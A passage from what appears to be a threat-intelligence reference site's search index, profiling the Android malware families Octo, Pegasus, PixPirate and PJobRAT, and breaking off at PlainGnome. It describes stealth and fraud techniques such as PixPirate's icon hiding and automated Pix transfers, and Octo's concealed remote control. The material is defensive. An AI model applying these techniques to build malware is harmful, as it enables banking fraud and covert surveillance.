botnet.\" Investigation revealed that ExobotCompact had been updated with remote access capabilities and rebranded as Octo. The rebrand accompanied a transition to a MaaS model under the operator \"Architect\" (also known as \"goodluck\").</p> <p>Octo2 (2024): Following a source code leak of Octo1 that spawned unauthorized forks, the original author released Octo2 with significant improvements to DGA, anti-analysis, and remote access stability.</p> <p>Possible Coper Descendants: Frogblight, a Turkish banking trojan discovered in 2025, shows possible connections to the Coper MaaS ecosystem according to Kaspersky's analysis. If confirmed, it would represent another branch of the Exobot lineage operating independently from Octo.</p>"},{"location":"malware/families/octo/#distribution","title":"Distribution","text":"Vector Details Google Play droppers Fake apps (fast cleaner, play store, etc.) uploaded to Google Play Third-party app stores APKs distributed through unofficial markets Smishing SMS campaigns directing victims to download pages MaaS affiliates Operators receive builder access and distribute through their own channels <p>ThreatFabric documented multiple Google Play dropper campaigns, including a \"Fast Cleaner\" app with 50,000+ installs that delivered Octo as its payload.</p>"},{"location":"malware/families/octo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/octo/#version-evolution","title":"Version Evolution","text":"Version Period Key Capabilities ExobotCompact 2018-2021 Overlay injection, SMS interception, keylogging, notification blocking Octo (v1) 2022-2024 All above + MediaProjection screen streaming, accessibility remote control, black screen hiding Octo2 2024-present All above + DGA for C2, dynamic key generation, improved obfuscation, enhanced remote access stability"},{"location":"malware/families/octo/#core-features","title":"Core Features","text":"Capability Implementation Screen streaming MediaProjection API captures screenshots at 1/sec, streamed to operator Remote input Accessibility service simulates taps, swipes, gestures, text input Overlay injection WebView-based injects triggered by target app detection Keylogging Captures PINs, URLs visited, clicks, focus changes, text edits SMS interception Reads, sends, and mutes incoming SMS Notification blocking Suppresses notifications from specified apps App launching Opens arbitrary apps on command Screen lock control Locks/unlocks device, mutes audio Black screen overlay Displays black screen and dims brightness to zero to hide remote operations"},{"location":"malware/families/octo/#remote-access-odf","title":"Remote Access (ODF)","text":"<p>The remote access capability is what elevated Octo above standard overlay-only trojans. The implementation:</p> <ol> <li>MediaProjection captures the screen as compressed screenshots at ~1 frame per second</li> <li>Screenshots are streamed to the operator's panel over the C2 channel</li> <li>The operator sees near-real-time device state and sends commands back</li> <li>Accessibility service executes the commands as taps, swipes, and text input</li> <li>A black screen overlay with zero brightness hides the activity from the victim</li> </ol> <p>This creates an interactive remote session within the victim's device, allowing the operator to navigate banking apps, initiate transfers, and confirm transactions as if holding the phone.</p>"},{"location":"malware/families/octo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/octo/#c2-communication","title":"C2 Communication","text":"<p>Octo v1:</p> Component Details Encryption AES with hardcoded static key Encoding Base64 over AES ciphertext Protocol HTTPS C2 resolution Hardcoded domains <p>Octo2:</p> Component Details Encryption AES with per-request dynamically generated keys Key exchange Cryptographic salt shared in request, C2 derives matching key Protocol HTTPS C2 resolution Domain Generation Algorithm (DGA) <p>ThreatFabric's Octo2 analysis details the improvements: instead of a static hardcoded key, each request generates a fresh encryption key. The salt is included in the request body so the C2 can independently derive the same key for decryption.</p>"},{"location":"malware/families/octo/#octo2-dga","title":"Octo2 DGA","text":"<p>The DGA generates C2 domain names dynamically, allowing operators to rotate infrastructure without rebuilding samples. ThreatFabric documented the implementation: a native library decrypts the malicious payload at runtime, generates encryption keys, and produces C2 domain names through the DGA algorithm.</p>"},{"location":"malware/families/octo/#anti-analysis-octo2","title":"Anti-Analysis (Octo2)","text":"Technique Details Multi-stage loading Native library decrypts and loads payload dynamically Code obfuscation More sophisticated than Octo1, multiple decryption layers DGA Eliminates static C2 indicators Dynamic key derivation Per-request encryption keys defeat traffic replay"},{"location":"malware/families/octo/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>Octo operates as a full MaaS platform:</p> <ul> <li>Panel: Web-based operator interface for managing bots, viewing screen streams, sending commands</li> <li>Builder: Generates customized APKs with operator-specific C2 configuration</li> <li>Inject hosting: C2 serves WebView-based overlays for target apps</li> <li>Bot management: Track infected devices, filter by country/installed apps</li> </ul> <p>Team Cymru documented the MaaS infrastructure from a network intelligence perspective, mapping C2 servers and operator panels.</p>"},{"location":"malware/families/octo/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Period Primary Targets 2021-2022 (Coper/ExobotCompact) Latin America, Europe 2022-2024 (Octo) Global, operator-dependent (MaaS) 2024 (Octo2) Italy, Poland, Moldova, Hungary (initial campaigns) <p>As a MaaS operation, Octo's targeting depends on individual operators. The platform provides inject kits covering banking apps across multiple regions, but each affiliate selects their own targets.</p>"},{"location":"malware/families/octo/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2022: ThreatFabric identified Octo on dark web forums and linked it to ExobotCompact, documenting the full lineage from Exobot. A \"Fast Cleaner\" app on Google Play with 50,000+ installs was identified as an Octo dropper.</p> <p>2022-2023: Team Cymru tracked Octo's MaaS infrastructure and documented increasing operator activity, with more campaigns and more affiliates gaining access to the platform.</p> <p>Early 2024: The Octo1 source code leaked, leading to multiple unauthorized forks by third-party actors. This fragmentation of the ecosystem likely motivated the original author to release Octo2.</p> <p>September 2024: ThreatFabric disclosed Octo2 with campaigns already targeting European banks in Italy, Poland, Moldova, and Hungary. Initial samples impersonated NordVPN and Google Chrome. The author offered Octo2 to existing Octo1 customers at the same price with early access.</p>"},{"location":"malware/families/octo/#references","title":"References","text":""},{"location":"malware/families/pegasus/","title":"Pegasus","text":"<p>Pegasus is the most well-documented mobile surveillance tool ever deployed. Developed by Israel's NSO Group, it provides operators with complete device compromise through zero-click exploit chains that require no interaction from the target. Sold exclusively to government clients under the label of \"lawful intercept,\" Pegasus has been found on the devices of journalists, human rights defenders, opposition politicians, and heads of state across dozens of countries. Its Android variant, internally called Chrysaor by Google, mirrors most iOS capabilities while adapting to the Android security model.</p>"},{"location":"malware/families/pegasus/#overview","title":"Overview","text":"Attribute Details First Seen August 2016 (public discovery) Status Active, continuously updated Type Commercial spyware (government-exclusive) Attribution NSO Group Technologies (Herzliya, Israel) Aliases Chrysaor (Google/Android), Trident (iOS exploit chain, 2016), Q Suite (marketing name) Platforms iOS, Android"},{"location":"malware/families/pegasus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>NSO Group was founded in 2010 by Niv Carmi, Shalev Hulio, and Omri Lavie, all with backgrounds in Israeli intelligence. The company operates under the claim that it sells only to vetted government agencies for counter-terrorism and law enforcement. Pegasus is the flagship product, though NSO also markets other tools under different names.</p> <p>The first public evidence of Pegasus emerged in August 2016 when UAE human rights defender Ahmed Mansoor received SMS messages containing exploit links. Rather than clicking, Mansoor forwarded them to Citizen Lab researchers, who published \"The Million Dollar Dissident\" in collaboration with Lookout Security. The analysis revealed a chain of three iOS zero-days (dubbed Trident) capable of remotely jailbreaking a stock iPhone 6.</p> <p>Lookout subsequently published a technical analysis of the Android variant in April 2017, designating it Chrysaor. The Android version does not rely on zero-days for rooting: it uses the Framaroot technique, a well-known set of Android root exploits. If rooting fails, it requests accessibility permissions to achieve data exfiltration through above-board APIs.</p>"},{"location":"malware/families/pegasus/#distribution","title":"Distribution","text":"<p>Pegasus delivery has evolved significantly over its lifetime, moving from one-click social engineering to fully remote zero-click exploitation.</p> Era Delivery Method Exploit Chain 2016 SMS with exploit link Trident: CVE-2016-4655 (KASLR bypass), CVE-2016-4656 (kernel exploit), CVE-2016-4657 (WebKit RCE) 2017-2018 Spear-phishing links via SMS, WhatsApp Various browser and kernel chains 2019 WhatsApp zero-day voice call CVE-2019-3568: buffer overflow in WhatsApp VOIP stack, no answer required 2020 Zero-click iMessage KISMET: exploited iMessage on iOS 13.5.1-13.7, discovered targeting Al Jazeera journalists 2021 Zero-click iMessage FORCEDENTRY: CVE-2021-30860, JBIG2 integer overflow in CoreGraphics PDF parser, bypassed BlastDoor sandbox 2022 Zero-click iMessage Three new chains exploiting iOS 15 and iOS 16, including PWNYOURHOME and FINDMYPWN <p>On Android, delivery typically involves a one-click link that downloads the implant APK. The operator sends a crafted SMS or message through any app. When the target taps the link, the browser redirects through an exploit server that either exploits a browser vulnerability or simply serves the APK with social engineering to encourage installation.</p> <p>For ISP-level deployment (documented in several countries), operators with access to network infrastructure can inject redirects into unencrypted HTTP traffic, pushing the malicious download without the need for phishing messages.</p>"},{"location":"malware/families/pegasus/#capabilities","title":"Capabilities","text":"<p>Once installed, Pegasus provides total device access. The implant operates as a persistent rootkit with the following capabilities:</p>"},{"location":"malware/families/pegasus/#data-collection","title":"Data Collection","text":"Category Details Messages SMS, MMS, iMessage, email (before and after encryption in E2E apps) Messaging apps WhatsApp, Telegram, Signal, Facebook Messenger, Viber, Skype (reads from local databases) Calls Live call recording and call log extraction Camera Silent activation of front and rear cameras Microphone Ambient audio recording, room tap functionality Location GPS, cell tower, Wi-Fi-based positioning with historical tracking Passwords Keychain/keystore extraction, stored Wi-Fi credentials Contacts Full address book exfiltration Calendar Calendar events and meeting details Files Browse and exfiltrate arbitrary files from device storage Browser History, bookmarks, saved passwords"},{"location":"malware/families/pegasus/#android-specific-behavior-chrysaor","title":"Android-Specific Behavior (Chrysaor)","text":"<p>The Android implant documented by Lookout and Cyber Geeks uses a layered approach:</p> Component Function Framaroot exploits Root the device using known kernel exploits (named after Lord of the Rings characters) Fallback mode If root fails, request accessibility and usage access permissions to exfiltrate data through Android APIs Self-destruct Remove itself if it detects it cannot operate covertly, if it has not contacted C2 within 60 days, or if it detects analysis Screenshot capture Framebuffer reading (rooted) or MediaProjection (non-rooted) Live audio Record calls and ambient audio via native audio APIs"},{"location":"malware/families/pegasus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pegasus/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Pegasus uses an anonymizing relay network for command and control. Citizen Lab mapped C2 infrastructure across 45 countries by fingerprinting the distinctive TLS certificates and HTTP responses of Pegasus installation servers. The C2 architecture routes through multiple proxy layers, making attribution to the operating government technically difficult but not impossible through DNS and infrastructure analysis.</p> <p>Exfiltrated data is transmitted over HTTPS, encrypted with unique per-device keys. The implant polls C2 for tasking commands and uploads collected data on a schedule or on-demand.</p>"},{"location":"malware/families/pegasus/#persistence","title":"Persistence","text":"<p>On rooted Android devices, Pegasus installs itself in system partitions and survives factory resets. On non-rooted devices, it leverages device administrator privileges and accessibility services to maintain presence, reinstalling itself if the user attempts removal.</p>"},{"location":"malware/families/pegasus/#forcedentry-the-benchmark-exploit","title":"FORCEDENTRY: The Benchmark Exploit","text":"<p>Google Project Zero published a detailed technical analysis of FORCEDENTRY, calling it \"one of the most technically sophisticated exploits we've ever seen.\" The exploit chain:</p> <ol> <li>Sends a PDF file disguised as a GIF through iMessage</li> <li>Triggers an integer overflow in the JBIG2 decoder within Apple's CoreGraphics</li> <li>Constructs a small CPU architecture from JBIG2 logical operations, building a Turing-complete virtual machine from a decompression codec</li> <li>Escapes the BlastDoor iMessage sandbox introduced in iOS 14</li> <li>Achieves kernel code execution and installs the Pegasus implant</li> </ol> <p>This demonstrated a level of exploit engineering previously assumed to be exclusive to top-tier nation-state programs.</p>"},{"location":"malware/families/pegasus/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Citizen Lab identified suspected Pegasus operators in 45 countries as of 2018. The Pegasus Project investigation in 2021, coordinated by Forbidden Stories with technical support from Amnesty International's Security Lab, revealed a leaked list of over 50,000 phone numbers selected as potential targets by NSO clients.</p> Country/Client Known Targets United Arab Emirates Ahmed Mansoor (human rights defender), journalists, activists Saudi Arabia Associates of Jamal Khashoggi (before his assassination), women's rights activists, Al Jazeera journalists Mexico Journalists investigating cartel corruption, lawyers, anti-corruption activists, scientists advocating sugar tax Morocco French journalists, Moroccan activists, French politicians including Emmanuel Macron's phone number on the list India Journalists, opposition politicians, lawyers, activists Hungary Investigative journalists, media owners Poland Opposition politicians, prosecutors Bahrain Activists, documented by Citizen Lab Rwanda Journalists, opposition figures El Salvador Journalists from El Faro"},{"location":"malware/families/pegasus/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>August 2016: Citizen Lab and Lookout publish \"The Million Dollar Dissident\", revealing the Trident exploit chain used against Ahmed Mansoor. Apple patches the three iOS zero-days within ten days. This is the first public documentation of Pegasus.</p> <p>April 2017: Lookout publishes the Chrysaor (Pegasus for Android) technical analysis, documenting the Framaroot-based rooting approach and the fallback non-root exfiltration mode.</p> <p>September 2018: Citizen Lab publishes \"Hide and Seek\", mapping suspected Pegasus operators in 45 countries through Internet scanning of C2 infrastructure.</p> <p>May 2019: WhatsApp discloses CVE-2019-3568, a buffer overflow in the VOIP call stack exploited by NSO to install Pegasus. No user interaction required: the exploit triggered via a missed call. WhatsApp (Meta) subsequently files a federal lawsuit against NSO Group.</p> <p>October 2019: Google Project Zero's analysis of CVE-2019-2215 (Bad Binder), a use-after-free in Android's Binder IPC, was linked to NSO Group's Pegasus delivery on Android devices including Pixel, Samsung, Huawei, and Xiaomi.</p> <p>December 2020: Citizen Lab reveals the KISMET exploit, a zero-click iMessage chain used to compromise phones of 36 Al Jazeera journalists. The exploit targeted iOS 13.5.1 through 13.7 and stopped working against iOS 14's BlastDoor mitigation.</p> <p>July 2021: The Pegasus Project publishes across 17 media organizations in 10 countries. Amnesty International's Security Lab releases the forensic methodology report and the Mobile Verification Toolkit (MVT), an open-source tool for checking devices for Pegasus indicators. Citizen Lab peer-reviews and validates Amnesty's methodology.</p> <p>September 2021: Citizen Lab captures the FORCEDENTRY exploit in the wild on a Saudi activist's phone. Apple patches CVE-2021-30860 and credits Citizen Lab. This is the first time a zero-click exploit for iMessage is captured as a complete artifact.</p> <p>December 2021: Google Project Zero publishes their deep dive into FORCEDENTRY, describing the JBIG2-based virtual machine as an unprecedented exploitation technique.</p> <p>November 2021: The U.S. Commerce Department adds NSO Group to the Entity List, restricting exports of U.S. technology to the company.</p> <p>April 2023: Citizen Lab documents three new zero-click exploit chains used in 2022 against civil society targets in Mexico, including PWNYOURHOME (targeting HomeKit and iMessage on iOS 15 and 16) and FINDMYPWN (targeting Find My and iMessage on iOS 15).</p> <p>October 2019 - present: Citizen Lab continues documenting new abuse cases, with over 100 identified across multiple countries.</p>"},{"location":"malware/families/pegasus/#references","title":"References","text":""},{"location":"malware/families/pixpirate/","title":"PixPirate","text":"<p>PixPirate is a Brazilian banking trojan built to exploit Pix, Brazil's instant payment platform used by over 100 million accounts. First documented by Cleafy in February 2023, the malware performs Automated Transfer System (ATS) fraud through accessibility services, initiating Pix transfers from the victim's banking app without user interaction. PixPirate introduced a novel stealth technique: the main payload has no launcher icon and no main activity, making it invisible in the app drawer. This is the first financial malware family observed using this method, which bypasses Android 10+ restrictions that previously stopped malware from hiding its icon.</p>"},{"location":"malware/families/pixpirate/#overview","title":"Overview","text":"Attribute Details First Seen Late 2022 Status Active Type Banking trojan, ATS fraud Attribution Unknown, Brazilian-origin operation Aliases PixPirate"},{"location":"malware/families/pixpirate/#origin-and-lineage","title":"Origin and Lineage","text":"<p>PixPirate was discovered by Cleafy's Threat Intelligence and Response (TIR) team between late 2022 and early 2023. It belongs to the generation of Android banking trojans that leverage ATS for on-device fraud, joining families like Anatsa, SharkBot, and Xenomorph in automating the entire transaction flow through accessibility services.</p> <p>PixPirate is distinct in its specialization. Rather than targeting a broad set of banking apps across multiple countries, it focuses exclusively on Pix, the real-time payment system operated by Brazil's Central Bank. Pix processes transactions instantly and irreversibly, making it an ideal target for automated fraud: once a transfer completes, the money is gone. The malware was built ground-up for this purpose, with JavaScript modules tailored to each targeted bank's Pix transfer interface.</p> <p>IBM Security Trusteer researchers later published extended analysis covering the dropper-payload architecture and the innovative icon-hiding technique.</p>"},{"location":"malware/families/pixpirate/#distribution","title":"Distribution","text":"<p>PixPirate uses a two-component distribution model: a separate dropper app and a payload app.</p>"},{"location":"malware/families/pixpirate/#dropper-downloader","title":"Dropper (Downloader)","text":"Attribute Details Distribution Smishing campaigns, WhatsApp spam from infected devices Store presence Not on Google Play Function Downloads or unpacks the payload APK, requests accessibility permissions Persistence Can be uninstalled without affecting the payload"},{"location":"malware/families/pixpirate/#payload-droppee","title":"Payload (Droppee)","text":"Attribute Details Distribution Installed by the dropper Store presence Not on Google Play Launcher icon None, completely invisible in app drawer Main activity No <code>android.intent.action.MAIN</code> / <code>android.intent.category.LAUNCHER</code> Activation Triggered via exported service that the dropper binds to <p>The payload intentionally lacks a launcher activity. On Android 10+, apps without a launcher activity do not display an icon in the app drawer, but this previously caused them to be non-functional since there was no way to launch them. PixPirate solved this by exporting a service that the dropper connects to, allowing the dropper to trigger the payload without a launcher entry.</p> <p>Even if the user uninstalls the dropper, the payload persists and can activate based on device events such as boot completion, connectivity changes, or other broadcast receivers.</p>"},{"location":"malware/families/pixpirate/#whatsapp-propagation","title":"WhatsApp Propagation","text":"<p>In later campaigns, IBM documented PixPirate spreading via WhatsApp. The payload uses accessibility capabilities to:</p> <ol> <li>Read the victim's WhatsApp contact list</li> <li>Send phishing messages with the dropper download link to contacts</li> <li>Propagate automatically without operator intervention</li> </ol> <p>This adds a worm-like dimension similar to FluBot's SMS propagation, but using WhatsApp as the channel instead of SMS.</p>"},{"location":"malware/families/pixpirate/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/pixpirate/#core-functions","title":"Core Functions","text":"Capability Description ATS fraud via Pix Automates Pix transfers using accessibility services to interact with banking app UI Credential theft Steals banking passwords by recognizing UI elements of targeted banks via accessibility SMS interception Reads, intercepts, and deletes SMS messages (OTP theft, evidence removal) Notification interception Monitors and suppresses notifications from banking apps Contact list access Reads contacts for WhatsApp-based propagation WhatsApp worm Sends phishing messages to contacts via WhatsApp Uninstall prevention Uses accessibility to disrupt settings navigation when user attempts removal Keylogging Records keystrokes on targeted apps Screen recording Captures screen content for operator review Remote control RAT functionality for manual operator intervention"},{"location":"malware/families/pixpirate/#ats-fraud-detail","title":"ATS Fraud Detail","text":"<p>PixPirate's ATS implementation is bank-specific. The malware includes JavaScript modules with functions tailored to each targeted bank's Pix transfer UI:</p> <pre><code>Victim opens banking app\n    \u2192 Accessibility service detects target bank's activity\n    \u2192 PixPirate identifies UI elements (password field, transfer buttons, amount fields)\n    \u2192 Injects credentials if needed (from prior theft)\n    \u2192 Navigates to Pix transfer flow\n    \u2192 Fills recipient details (mule account controlled by operators)\n    \u2192 Sets transfer amount\n    \u2192 Confirms transaction\n    \u2192 Clears notification evidence\n</code></pre> <p>Each bank has a dedicated function because Pix transfer UIs differ between banking apps. The malware recognizes specific view hierarchies, button labels, and field identifiers per bank.</p>"},{"location":"malware/families/pixpirate/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pixpirate/#architecture","title":"Architecture","text":"<pre><code>Dropper APK (visible, has launcher icon)\n    \u2192 Downloads/unpacks Payload APK\n    \u2192 Requests Accessibility Service permission via persistent pop-ups\n    \u2192 Binds to Payload's exported service to trigger activation\n    \u2192 Can be safely uninstalled by user (payload survives)\n\nPayload APK (invisible, no launcher icon)\n    \u2192 No android.intent.action.MAIN\n    \u2192 No android.intent.category.LAUNCHER\n    \u2192 Exports a Service for dropper binding\n    \u2192 Registers BroadcastReceivers for:\n        - BOOT_COMPLETED\n        - CONNECTIVITY_CHANGE\n        - PACKAGE_REPLACED\n    \u2192 Persists independently of dropper\n</code></pre>"},{"location":"malware/families/pixpirate/#icon-hiding-technique","title":"Icon Hiding Technique","text":"<p>Prior to PixPirate, Android malware hid launcher icons by calling <code>setComponentEnabledSetting()</code> to disable the launcher activity after installation. Android 10 blocked this approach. PixPirate bypasses the restriction entirely by never declaring a launcher activity in the first place. The manifest contains no activity with <code>MAIN</code> + <code>LAUNCHER</code> intent filters, so the system never creates an icon. Activation is handled through the exported service and broadcast receivers.</p>"},{"location":"malware/families/pixpirate/#c2-communication","title":"C2 Communication","text":"Parameter Details Protocol HTTP Data format JSON TLS Certificate pinning to prevent MITM inspection Commands Transfer instructions, mule account details, target bank configurations, module updates <p>Cleafy noted the use of certificate pinning on C2 communications, which prevents traffic interception even on devices with user-installed CA certificates. The C2 delivers configuration updates including new bank-specific JavaScript modules and mule account rotation.</p>"},{"location":"malware/families/pixpirate/#anti-analysis","title":"Anti-Analysis","text":"Technique Description Code obfuscation Heavy obfuscation with garbage functions requiring multiple deobfuscation passes String encryption Encrypted strings decrypted at runtime No launcher icon Invisible to standard device inspection Certificate pinning Prevents C2 traffic interception Anti-emulator Checks for emulator artifacts Anti-debugging Detects debugging tools"},{"location":"malware/families/pixpirate/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>PixPirate requests accessibility permissions through persistent fake pop-ups that reappear until the victim grants access. Once enabled, the accessibility service provides:</p> <ul> <li>Real-time monitoring of foreground activities (for trigger detection)</li> <li>UI element inspection (for ATS automation)</li> <li>Click and gesture injection (for performing transfers)</li> <li>Notification access (for OTP interception and suppression)</li> <li>Keylogging (for credential capture)</li> </ul>"},{"location":"malware/families/pixpirate/#target-regions","title":"Target Regions","text":"Region Status Notes Brazil Primary target All known bank-specific modules target Brazilian financial institutions via Pix India Expanding IBM documented WhatsApp-based campaigns targeting Indian users Italy Early stage IBM identified initial campaigns Mexico Early stage IBM identified initial campaigns <p>The expansion beyond Brazil is significant. While Pix is Brazil-specific, the malware's ATS capabilities and WhatsApp propagation mechanism are adaptable to other instant payment platforms and banking apps.</p>"},{"location":"malware/families/pixpirate/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022, Late: PixPirate first observed in the wild targeting Brazilian banking users. Distributed via smishing campaigns directing victims to download a fake authenticator app.</p> <p>2023, February: Cleafy publishes initial analysis documenting PixPirate's ATS capabilities against Pix, its accessibility abuse, and its dropper-based distribution. The report details the bank-specific JavaScript modules and C2 architecture.</p> <p>2024, February: IBM Security Trusteer publishes detailed analysis of the novel icon-hiding technique, documenting how the payload operates without a launcher activity and persists independently of the dropper. BleepingComputer, The Hacker News, and Dark Reading publish coverage highlighting this as the first financial malware to use the no-launcher-activity approach.</p> <p>2024-2025: IBM documents PixPirate's expansion via WhatsApp. The malware begins targeting users in India, Italy, and Mexico, using WhatsApp spam from infected devices to spread the dropper. The WhatsApp propagation mechanism gives the campaign worm-like characteristics similar to FluBot's SMS spreading.</p>"},{"location":"malware/families/pixpirate/#references","title":"References","text":""},{"location":"malware/families/pjobrat/","title":"PJobRAT","text":"<p>PJobRAT is an Android RAT built for targeted espionage against military and government personnel. First documented in 2021 when it was deployed against Indian military targets through fake dating and messaging apps, the malware went quiet before Sophos X-Ops identified a retooled campaign in March 2025 that had been running from January 2023 through October 2024, this time targeting users in Taiwan. The new variant dropped the WhatsApp-scraping module from the original version and replaced it with a remote shell capability, expanding the operator's reach from predefined data theft to arbitrary command execution on the victim device. PJobRAT uses a dual-channel C2 architecture: HTTP for data exfiltration and Firebase Cloud Messaging for command dispatch.</p>"},{"location":"malware/families/pjobrat/#overview","title":"Overview","text":"Attribute Details First Seen 2021 (India campaign); January 2023 (Taiwan campaign) Last Seen October 2024 (Taiwan campaign ceased) Status Inactive (latest campaign); likely retooling Type Remote Access Trojan, espionage Attribution Unknown, possibly state-aligned; original campaign suggested Chinese or Pakistani origin Distribution Fake messaging apps hosted on WordPress sites"},{"location":"malware/families/pjobrat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>PJobRAT has no known derivation from public RAT builders or leaked source code. The original 2021 variant targeted Indian military personnel through apps disguised as dating platforms (Trendbanter) and Signal clones. Cyble's initial analysis revealed the malware used BIND_ACCESSIBILITY_SERVICE to hook into WhatsApp's UI and extract contacts and messages directly. The 2021 campaign infrastructure and app distribution pointed toward actors with interest in Indian defense intelligence, with researchers suggesting Chinese or Pakistani origin.</p> <p>The 2023-2024 Taiwan campaign represents a significant retooling. Sophos documented that the new variant removed the dedicated WhatsApp-stealing module entirely, replacing it with a general-purpose shell command capability. This shift from hardcoded data targets to flexible command execution reflects an operator prioritizing adaptability over specialized collection.</p> <p>Unlike commodity RATs such as SpyNote that are openly sold and widely deployed, PJobRAT appears to be a private tool used in narrow, targeted campaigns with long operational windows.</p>"},{"location":"malware/families/pjobrat/#distribution","title":"Distribution","text":"<p>PJobRAT's Taiwan campaign distributed malware through fake instant messaging apps hosted on WordPress sites. The operator created convincing app listings rather than relying on Play Store infiltration or smishing at scale.</p> Vector Details SangaalLite Fake messaging app, name likely mimicking \"SignalLite,\" hosted on WordPress sites CChat Impersonation of a legitimate chat app with the same name, also WordPress-hosted WordPress infrastructure Multiple WordPress sites served as download portals, earliest artifact from January 2023"},{"location":"malware/families/pjobrat/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target discovers a WordPress-hosted page advertising SangaalLite or CChat as a messaging app</li> <li>Target downloads and installs the APK from the WordPress site</li> <li>The app requests extensive permissions including accessibility services, battery optimization exemption, and storage access</li> <li>PJobRAT begins collecting device metadata, contacts, SMS, call logs, and location data</li> <li>Collected data is exfiltrated to the C2 server over HTTP</li> <li>The operator sends shell commands via Firebase Cloud Messaging to execute arbitrary actions</li> <li>The operator can extract files (documents, images, audio, video), scrape screen content, or pivot further into the device</li> </ol> <p>The campaign ran for nearly two years (January 2023 to October 2024) before going silent. All identified victims were located in Taiwan.</p>"},{"location":"malware/families/pjobrat/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/pjobrat/#core-features","title":"Core Features","text":"Capability Implementation Device metadata collection Harvests device model, OS version, IMEI, carrier info, and installed apps Contact exfiltration Extracts the full contact list from the device SMS theft Reads and uploads all SMS messages Call log access Collects complete call history Location tracking Captures GPS coordinates File exfiltration Uploads documents (.doc, .pdf), images, audio, and video from device and external storage Screen scraping Abuses accessibility services to read on-screen content from any app Remote shell Executes arbitrary shell commands received via FCM Background persistence Requests battery optimization exemption to maintain continuous operation"},{"location":"malware/families/pjobrat/#dual-channel-c2","title":"Dual-Channel C2","text":"<p>PJobRAT splits its C2 communication across two channels:</p> Channel Purpose HTTP Uploads stolen data (device info, SMS, contacts, files) to the C2 server Firebase Cloud Messaging Receives commands from the operator, including shell commands and exfiltration directives <p>This separation keeps command traffic within Google's legitimate FCM infrastructure, making it harder to detect at the network level. Data exfiltration flows over standard HTTP to attacker-controlled servers.</p>"},{"location":"malware/families/pjobrat/#evolution-from-2021-to-2024","title":"Evolution from 2021 to 2024","text":"Feature 2021 Version 2024 Version WhatsApp theft Dedicated module using accessibility service hooks Removed; replaced by shell command capability Shell commands Not present Full remote shell via FCM Distribution Third-party app stores, dating app lures WordPress-hosted fake messaging apps Target region India (military personnel) Taiwan C2 channels HTTP + FCM HTTP + FCM (unchanged) <p>The shell command addition is the most significant upgrade. It allows the operator to extract WhatsApp databases (or any other app data) on demand, root the device if a local privilege escalation exists, pivot to other systems on the same network, and silently uninstall the malware after objectives are met.</p>"},{"location":"malware/families/pjobrat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pjobrat/#permissions-abuse","title":"Permissions Abuse","text":"<p>PJobRAT requests a broad set of permissions at install time:</p> Permission Purpose BIND_ACCESSIBILITY_SERVICE Screen scraping, reading content from any visible app READ_CONTACTS, READ_SMS, READ_CALL_LOG Data collection from contacts, messages, and call history ACCESS_FINE_LOCATION GPS tracking READ_EXTERNAL_STORAGE File access on device and SD card REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Persistent background execution CAMERA, RECORD_AUDIO Media capture (present in permissions manifest)"},{"location":"malware/families/pjobrat/#firebase-cloud-messaging-integration","title":"Firebase Cloud Messaging Integration","text":"<p>FCM serves as the command channel. The operator pushes commands to the infected device through Google's notification infrastructure. This approach has two tactical advantages: FCM traffic blends with normal Android push notification traffic, and the operator does not need to maintain a persistent connection to the device.</p>"},{"location":"malware/families/pjobrat/#target-regions","title":"Target Regions","text":"Region Campaign Details India 2021 Military personnel targeted via fake dating and messaging apps Taiwan 2023-2024 Users targeted via WordPress-hosted fake chat apps (SangaalLite, CChat) <p>The shift from India to Taiwan suggests either a change in operator priorities or the tool being repurposed by a different group with different intelligence requirements.</p>"},{"location":"malware/families/pjobrat/#notable-campaigns","title":"Notable Campaigns","text":"<p>2021: PJobRAT is first identified by Cyble and 360 Core Security Lab targeting Indian military personnel. The malware hides inside fake dating apps (Trendbanter) and Signal clones distributed through third-party app stores. It uses accessibility services to steal WhatsApp conversations directly from the screen.</p> <p>January 2023: A retooled PJobRAT variant appears on WordPress-hosted sites offering SangaalLite and CChat downloads. The campaign targets Taiwanese users with a new version that replaces WhatsApp-specific theft with general shell command execution.</p> <p>October 2024: The Taiwan campaign goes silent. No new samples or active C2 infrastructure are detected after this point.</p> <p>March 2025: Sophos X-Ops publishes the full analysis of the Taiwan campaign, detailing the dual-channel C2 architecture, shell command capabilities, and WordPress-based distribution.</p>"},{"location":"malware/families/pjobrat/#related-families","title":"Related Families","text":"<p>PJobRAT occupies a niche similar to other targeted espionage tools rather than the commodity banking trojan ecosystem. Its closest functional parallels are state-aligned surveillance families like Pegasus and Predator, though PJobRAT operates at a far lower level of sophistication, requiring social engineering for installation rather than exploit chains.</p> <p>The use of accessibility services for data scraping mirrors techniques found across the Android malware landscape, from banking trojans like Hook and Octo to other RATs like SpyNote. The difference is intent: where banking trojans use accessibility to perform overlay attacks and credential theft, PJobRAT uses it purely for intelligence collection.</p> <p>PJobRAT's FCM-based command channel is a pattern also seen in SpyNote and other Android RATs, where leveraging Google infrastructure for C2 provides both reliability and network-level stealth.</p>"},{"location":"malware/families/pjobrat/#references","title":"References","text":""},{"location":"malware/families/plaingnome/","title":"PlainGnome","text":"<p>PlainGnome is a custom-built Android surveillanceware family discovered by Lookout in December 2024, initially attributed to Gamaredon (Primitive Bear/Shuckworm, an FSB-linked APT group) and later reattributed to Sandcat, an Uzbekistan-based threat actor associated with Uzbekistan's State Security Service (SSS). Unlike its companion family BoneSpy, PlainGnome is not derived from existing open-source surveillance code. It is a purpose-built tool with a two-stage deployment architecture: a minimal first-stage dropper installs a second-stage surveillance payload stored within the dropper package. PlainGnome performs emulator 